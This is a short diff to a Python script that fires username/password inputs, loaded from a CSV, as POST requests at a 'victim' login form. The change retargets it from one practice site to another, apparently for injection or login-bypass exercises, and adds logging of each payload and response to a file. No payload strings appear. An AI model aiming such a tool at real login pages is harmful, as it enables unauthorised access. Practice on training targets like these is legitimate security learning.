@@ -8,7 +8,7 @@ from pull_from_CSV import *
 #generates and executes POST requests to the victim webserver
 def POST_generator():
 
-    URL = "http://wargame.kr:8080/login_filtering/"
+    URL = "https://sqlzoo.net/hack/passwd.pl"
     r = requests.get(URL)
     html_bytes = r.text
 
@@ -51,7 +51,11 @@ def POST_send(URL, username_field, password_field, username_input, password_inpu
     payload = {username_field: username_input, password_field : password_input}
     victim = URL
     r = requests.post(victim, payload)
-    #print(r.text)
+    
+    #temp test code to write to file
+    file = open("hi.txt", "a")
+    file.write("Hello this is the payload: " + username_input + "\n\n" + r.text + "\n\n")
+    print(r.status_code)
 
 if __name__ == "__main__" :
 
